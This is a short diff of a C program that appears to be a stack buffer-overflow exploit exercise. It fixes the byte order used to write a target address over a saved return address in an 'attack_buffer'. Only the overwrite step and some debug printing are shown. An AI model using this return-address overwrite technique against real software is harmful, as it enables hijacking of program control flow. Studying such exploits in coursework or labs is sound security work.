@@ -32,10 +32,10 @@ main ( int argc, char * argv[] )
 	// for(int i = 0; i < 6; i++){
 	// 	*(attack_buffer+120+i) = ptr[i];
 	// }
-	attack_buffer[BUF_TO_RET + 3] = (char) (target & 0xff);
-	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 8) & 0xff);
-	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 16) & 0xff);
-	attack_buffer[BUF_TO_RET] = (char) ((target >> 24) & 0xff);
+	attack_buffer[BUF_TO_RET] = (char) (target & 0xff);
+	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 8) & 0xff);
+	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 16) & 0xff);
+	attack_buffer[BUF_TO_RET + 3] = (char) ((target >> 24) & 0xff);
 
 	printf("attack_buffer %s\n",attack_buffer);
 	printf("%x%x%x%x\n",attack_buffer[BUF_TO_RET],
